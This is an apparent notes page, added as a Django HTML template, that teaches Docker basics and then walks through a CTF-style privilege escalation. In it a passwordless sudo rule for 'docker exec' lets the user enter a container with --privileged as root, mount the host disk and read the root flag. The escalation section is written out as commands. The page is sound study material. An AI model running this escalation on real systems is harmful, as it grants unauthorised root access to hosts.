@@ -1,0 +1,439 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>What is docker?</h1>
+    <div class="list">
+        <h3 class="blue">Docker</h3>
+        <ul>
+            <li>Docker is a containerization platform.</li>
+            <li>It lets you run applications in isolated environments called containers.</li>
+            <li>Packages your app + dependencies + environment into a single unit</li>
+        </ul>
+    </div>
+    
+
+    <table>
+        <tbody>
+            <tr>
+                <td>VM</td>
+                <td>Whole apartment with its own OS, furniture, etc.</td>
+            </tr>
+            <tr>
+                <td>Docker Container</td>
+                <td>A fully furnished room in a shared apartment—lightweight, isolated, fast to set up.</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <h2>⭐ Basic Virtualization Terms</h2>
+<table>
+  <thead>
+    <tr>
+      <th>Term</th>
+      <th>Meaning</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Host OS</td>
+      <td>The actual operating system running on the physical PC or server (e.g., Ubuntu, Kali Linux)</td>
+    </tr>
+    <tr>
+      <td>Guest OS</td>
+      <td>A virtualized or containerized operating system environment isolated from the host (e.g., inside a VM or container)</td>
+    </tr>
+    <tr>
+      <td>Host</td>
+      <td>The real machine and OS that supports and runs virtual environments like containers or VMs</td>
+    </tr>
+    <tr>
+      <td>Container</td>
+      <td>A lightweight, isolated space running on the host that shares its resources but appears as a separate environment</td>
+    </tr>
+  </tbody>
+</table>
+
+
+    <h1>Main Purpose</h1>
+    <div class="list">
+        <h3 class="blue">1. isolation</h3>
+        <ul>
+            <li>Docker containers isolate applications' file systems, processes, and network stack.</li>
+            <li>This avoids dependency hell and prevents apps from interfering with each other.</li>
+        </ul>
+    </div>
+
+    <h1>Common codes</h1>
+    <table>
+        <thead>
+            <tr>
+                <th>Command</th>
+                <th>Purpose</th>
+                <th>Exmple Usage</th>
+                <th>Description</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>docker ps</td>
+                <td>Show running containers</td>
+                <td>docker ps</td>
+                <td>Lists only running containers (like ps in Linux). Use -a to see all containers including stopped ones.</td>
+            </tr>
+            <tr>
+                <td>docker exec -it &lt;id&gt; bash</td>
+                <td>Access a <u class="red">running</u> container</td>
+                <td>docker exec -it 123abc bash</td>
+                <td>Starts an interactive bash shell inside a running container. -i = interactive, -t = TTY.</td>
+            </tr>
+            <tr>
+                <td>docker run</td>
+                <td>Start a <u class="red">new</u> container</td>
+                <td>docker run -it ubuntu bash</td>
+                <td>Creates and starts a new container from an image. Can attach terminal, set ports, volumes, etc.</td>
+            </tr>
+            <tr>
+                <td>docker images</td>
+                <td>Show all local images</td>
+                <td>docker images</td>
+                <td>Lists all Docker images you have pulled or built locally.</td>
+            </tr>
+            <tr>
+                <td>docker inspect</td>
+                <td>View low-level container/image info</td>
+                <td>docker inspect 123abc</td>
+                <td>Outputs detailed JSON data about a container or image: env, mounts, IP, entrypoint, etc.</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <h1>Docker Option Flags</h1>
+    <table>
+        <thead>
+            <tr>
+                <th>Option</th>
+                <th>Command Context</th>
+                <th>Example Usage</th>
+                <th>Description</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>-i</td>
+                <td>docker exec / docker run</td>
+                <td>docker exec -i 123abc bash</td>
+                <td>Keep STDIN open (for interactive use).</td>
+            </tr>
+            <tr>
+                <td>-t</td>
+                <td>docker exec / docker run</td>
+                <td>docker run -t ubuntu</td>
+                <td>Allocate a pseudo-TTY (creates a terminal).</td>
+            </tr>
+            <tr>
+                <td>-it</td>
+                <td>docker exec / docker run</td>
+                <td>docker exec -it 123abc bash</td>
+                <td>Combination of <code>-i</code> and <code>-t</code> for full terminal interaction.</td>
+            </tr>
+            <tr>
+                <td>--privileged</td>
+                <td>docker run</td>
+                <td>docker run --privileged ubuntu</td>
+                <td>Grants full access to all devices and kernel capabilities inside the container.</td>
+            </tr>
+            <tr>
+                <td>--user</td>
+                <td>docker run</td>
+                <td>docker run --user root</td>
+                <td>Tells Docker to run the command as root inside the container, regardless of default container user.</td>
+            </tr>
+            <tr>
+                <td>-d</td>
+                <td>docker run</td>
+                <td>docker run -d nginx</td>
+                <td>Run container in background (detached mode).</td>
+            </tr>
+            <tr>
+                <td>-p</td>
+                <td>docker run</td>
+                <td>docker run -p 8080:80 nginx</td>
+                <td>Maps host port to container port (host:container).</td>
+            </tr>
+            <tr>
+                <td>--rm</td>
+                <td>docker run</td>
+                <td>docker run --rm ubuntu</td>
+                <td>Automatically remove the container when it exits.</td>
+            </tr>
+            <tr>
+                <td>-v</td>
+                <td>docker run</td>
+                <td>docker run -v /host:/container ubuntu</td>
+                <td>Mount a host directory into the container.</td>
+            </tr>
+        </tbody>
+    </table>
+
+
+    <h1>How to Start</h1>
+    <div class="list">
+        <h1>1. </h1>
+        <div class="code-box"><pre><code>└─$ sudo docker pull jenkins/jenkins:lts-jdk17</code></pre></div>
+        <h2 class="blue">🧠 What it does:</h2>
+        <ul>
+            <li>Downloads the Jenkins Docker image from Docker Hub:</li>
+            <li>jenkins/jenkins = the official Jenkins image</li>
+            <li>lts-jdk17 = Long-Term Support (LTS) version of Jenkins built with Java 17</li>
+        </ul>
+        <h2 class="blue">📦 Result:</h2>
+        <ul><li>You now have the image locally cached so it can be run without needing to re-download.</li></ul>        
+    </div>
+
+
+    <div class="list">
+        <h1>2. </h1>
+        <div class="code-box"><pre><code>└─$ sudo docker run -p 8080:8080 --restart=on-failure jenkins/jenkins:lts-jdk17</code></pre></div>
+        <h2 class="blue">🧠 What it does:</h2>
+        <table border="1" cellpadding="6" cellspacing="0">
+            <thead>
+                <tr>
+                <th>Option</th>
+                <th>Meaning</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                <td><code>docker run</code></td>
+                <td>Start a new container</td>
+                </tr>
+                <tr>
+                <td><code>-p 8080:8080</code></td>
+                <td><strong>Port forwarding</strong>: expose container port 8080 → host port 8080 (so you can access Jenkins at <code>http://localhost:8080</code>)</td>
+                </tr>
+                <tr>
+                <td><code>--restart=on-failure</code></td>
+                <td>If the container crashes (exits with error), Docker will <strong>automatically restart</strong> it</td>
+                </tr>
+                <tr>
+                <td><code>jenkins/jenkins:lts-jdk17</code></td>
+                <td>The image to run (previously pulled)</td>
+                </tr>
+            </tbody>
+        </table>
+
+    </div>
+
+    <div class="list">
+        <h1>3. </h1>
+        <div class="code-box"><pre><code>└─$ sudo docker ps -a</code></pre></div>
+        <h2 class="blue">📋 Lists all Docker containers, including:</h2>
+        <ul>
+            <li>Running</li>
+            <li>Stopped</li>
+            <li>Exited</li>
+        </ul>
+        <p class="common">Useful for finding container IDs, names, and statuses</p>
+    </div>
+
+
+    <div class="list">
+        <h1>4. </h1>
+        <div class="code-box"><pre><code>└─$ sudo docker start 2b3</code></pre></div>
+        <ul>
+            <li>Starts the container whose ID starts with 2b3</li>
+            <li>Docker allows partial container IDs, as long as they are unambiguous</li>
+            <li>The container must already exist (e.g., created earlier)</li>
+        </ul>
+    </div>
+
+    <div class="list">
+        <h1>5. </h1>
+        <div class="code-box"><pre><code>└─$ sudo docker exec -it 2b3 bash</code></pre></div>
+        <ul>
+            <li>Executes an interactive shell (bash) inside the running container</li>
+            <li>-i: interactive mode (keeps STDIN open)</li>
+            <li>-t: allocates a pseudo-terminal (gives you a shell-like interface)</li>
+            <li>This is how you “enter” a running container</li>
+        </ul>
+    </div>
+
+
+    <h1>Jargons</h1>
+    <div class="list">
+        <h3 class="blue">keep STDIN open</h3>
+        <ul>
+            <li>The -i flag keeps the keyboard input (STDIN) open even if you're not typing, so the container can read input from you continuously.</li>
+            <li>Without -i, commands like bash would start and immediately exit because there's no user input.</li>
+    </ul>
+    </div>
+    <div class="list">
+        <h3 class="blue">pseudo-TTY</h3>
+        <ul>
+            <li> fake terminal interface that programs can interact with as if they were connected to a real terminal (like a keyboard + monitor).</li>
+            <li>run interactively</li>
+            <li>use terminal-like features (input/output, line editing, signals)</li>
+        </ul>
+    </div>
+    <div class="list">
+        <h3 class="blue">docker exec -it &lt;container_id&gt; bash</h3>
+        <ul>
+            <li>-i keeps STDIN open (so you can send input)</li>
+            <li>-t allocates a pseudo-TTY, making the session behave like a terminal</li>
+        </ul>
+
+        <h3>This allows you</h3>
+        <ul>
+            <li>get a colorized prompt</li>
+            <li>use keyboard shortcuts (like Ctrl+C)</li>
+            <li>use interactive shell tools (nano, top, htop, etc.)</li>
+        </ul>
+    </div>
+
+    <h1>Real Case Explanation</h1>
+
+    <h3 class="blue">1. Docker-Related Restrictions and Information Gathering</h3>
+    <ul>
+        <li>Attempting to run docker ps results in a permission error</li>
+    </ul>
+    <div class="code-box"><pre><code>user@data:~$ docker ps
+Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock</code></pre></div>
+
+    <ul><li>Checking the permissions of the Docker socket</li></ul>
+    <div class="code-box"><pre><code>user@data:~$ ls -l /var/run/docker.sock
+srw-rw---- 1 root root 0 Jun 16 01:16 /var/run/docker.sock</code></pre></div>
+    <ul><li>Listing running Docker-related processes</li></ul>
+    <div class="code-box"><pre><code>user@data:~$ ps auxww | grep docker
+...
+root 1517 ... containerd-shim-runc-v2 -id e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 ...
+</code></pre></div>
+
+    <h3>※ps auxww</h3>
+    <table>
+        <thead>
+            <tr>
+                <th>Part</th>
+                <th>Meaning</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>ps</td>
+                <td>Process Status - the base command to show current running processes</td>
+            </tr>
+            <tr>
+                <td>a</td>
+                <td>Show processes for all users (not just your own)</td>
+            </tr>
+            <tr>
+                <td>u</td>
+                <td>Show the process's user/owner and more detailed info</td>
+            </tr>
+            <tr>
+                <td>x</td>
+                <td>Show processes not attached to a terminal (e.g., daemons)</td>
+            </tr>
+            <tr>
+                <td>ww</td>
+                <td>Show full command lines, no truncation (wide format x2)</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <h3 class="blue">2. Privilege Escalation Trigger</h3>
+    <ul><li>sudo -l reveals Docker exec privilege without password</li></ul>
+    <div class="code-box">
+        <pre><code>User user may run the following commands on localhost:
+    (root) NOPASSWD: /snap/bin/docker exec *
+</code></pre>
+    </div>
+
+    <h3 class="blue">3. Privilege Escalation: Gaining Host Access</h3>
+    <ul><li>Entering a running container as root with --privileged</li></ul>
+    <div class="code-box"><pre><code>user@data:~$ sudo docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 bash
+bash-5.1#</code></pre></div>
+        <ul><li>Mounting the host filesystem inside the container</li></ul>
+        <div class="code-box"><pre><code>bash-5.1# mount /dev/sda1 /mnt/</code></pre></div>
+
+    <ul><li>Reading the root flag from the host</li></ul>
+    <div class="code-box"><pre><code>bash-5.1# cat /mnt/root/root.txt
+d5a19473************************</code></pre></div>
+
+<h1>Basic Knowledge to Read <code>mount /dev/sda1 /mnt/</code> Output</h1>
+
+<h3>1. Left Side = Mount <i>Source</i> (Where the data comes from)</h3>
+<table>
+  <thead>
+    <tr>
+      <th>Example</th>
+      <th>Meaning</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr><td>/dev/sda1</td><td>Physical disk (SSD/HDD) partition</td></tr>
+    <tr><td>tmpfs, proc, sysfs</td><td>Virtual filesystems (RAM-based or kernel-generated)</td></tr>
+    <tr><td>/var/lib/snapd/snaps/...</td><td>Snap application squashfs image</td></tr>
+  </tbody>
+</table>
+
+<h3>2. Right Side = Mount <i>Target</i> (Where it's mounted into the OS)</h3>
+<table>
+  <thead>
+    <tr>
+      <th>Example</th>
+      <th>Meaning</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr><td>/</td><td>Root of the entire system (top-level directory)</td></tr>
+    <tr><td>/mnt/</td><td>Temporary mount point for external disks</td></tr>
+    <tr><td>/snap/...</td><td>Snap app read-only mount location</td></tr>
+    <tr><td>/proc, /sys, /dev</td><td>Virtual filesystem entries for system internals</td></tr>
+  </tbody>
+</table>
+
+<h3>3. Common <code>mount</code> Lines and Their Purpose</h3>
+<table>
+  <thead>
+    <tr>
+      <th><code>mount</code> Line</th>
+      <th>Explanation</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr><td>/dev/sda1 on /</td><td>System is running from this physical disk partition (root filesystem)</td></tr>
+    <tr><td>tmpfs on /run</td><td>Temporary space in RAM; disappears after reboot</td></tr>
+    <tr><td>proc on /proc</td><td>Shows kernel + process info (virtual, not real files)</td></tr>
+    <tr><td>/dev on /dev</td><td>Access point for hardware (USB, storage, etc.)</td></tr>
+    <tr><td>/var/lib/snapd/snaps/... on /snap/...</td><td>Snap apps mounted as read-only images</td></tr>
+    <tr><td>lxcfs on /var/lib/lxcfs</td><td>Used by LXC/LXD containerization systems</td></tr>
+    <tr><td>nsfs on /run/snapd/ns/docker.mnt</td><td>Namespace FS, used to isolate Docker/Snap containers</td></tr>
+  </tbody>
+</table>
+
+<h3>4. Summary: What to Focus On in CTFs or Linux Escalation</h3>
+<table>
+  <thead>
+    <tr>
+      <th>Purpose</th>
+      <th>Look for</th>
+      <th>Why?</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr><td>Access host root filesystem</td><td>/dev/sda1 on /</td><td>If you can remount this somewhere else (e.g., /mnt), you can read the host OS</td></tr>
+    <tr><td>Detect Snap-based containers</td><td>/snap/...</td><td>Snap sandboxing affects escape/persistence flow</td></tr>
+    <tr><td>Inspect RAM usage or file hiding spots</td><td>tmpfs on ...</td><td>Useful for hiding payloads or doing memory forensics</td></tr>
+    <tr><td>Extract internal system info</td><td>/proc, /sys</td><td>Can help reveal processes, hardware, network info without using tools</td></tr>
+  </tbody>
+</table>
+
+</body>
+</html>
